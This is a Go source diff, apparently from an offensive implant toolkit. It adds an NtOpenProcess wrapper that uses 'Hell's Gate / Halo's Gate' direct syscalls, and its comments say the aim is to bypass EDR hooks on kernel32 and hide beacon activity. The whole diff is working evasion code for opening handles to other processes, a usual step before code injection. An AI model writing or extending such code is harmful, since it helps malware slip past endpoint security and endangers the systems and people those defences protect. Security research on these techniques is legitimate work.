@@ -199,6 +199,48 @@ func NtUnmap(hProc windows.Handle, base uintptr) {
 
 // ─── Sleep ───────────────────────────────────────────────────────────────────
 
+// ─── Process handle ──────────────────────────────────────────────────────────
+
+// objectAttributes mirrors the NT OBJECT_ATTRIBUTES structure.
+type objectAttributes struct {
+	Length                   uint32
+	RootDirectory            uintptr
+	ObjectName               uintptr
+	Attributes               uint32
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
+}
+
+// clientID mirrors the NT CLIENT_ID structure (process + thread HANDLE pair).
+type clientID struct {
+	UniqueProcess uintptr
+	UniqueThread  uintptr
+}
+
+// NtOpenProcess opens a handle to pid with the given access mask.
+// Routes through Hell's Gate / Halo's Gate so the kernel trap frame shows
+// ntdll rather than a hooked kernel32!OpenProcess stub.
+func NtOpenProcess(pid uint32, access uint32) (windows.Handle, error) {
+	var handle uintptr
+	var oa objectAttributes
+	oa.Length = uint32(unsafe.Sizeof(oa))
+	var cid clientID
+	cid.UniqueProcess = uintptr(pid)
+
+	_, err := HellsGateCall("NtOpenProcess",
+		uintptr(unsafe.Pointer(&handle)),
+		uintptr(access),
+		uintptr(unsafe.Pointer(&oa)),
+		uintptr(unsafe.Pointer(&cid)),
+	)
+	if err != nil {
+		return 0, fmt.Errorf("NtOpenProcess(%d): %w", pid, err)
+	}
+	return windows.Handle(handle), nil
+}
+
+// ─── Sleep ───────────────────────────────────────────────────────────────────
+
 // NtDelay sleeps for d using NtDelayExecution (direct syscall — avoids the
 // hooked Sleep/SleepEx path that some EDRs instrument for beacon detection).
 // Falls back to time.Sleep if the syscall fails.
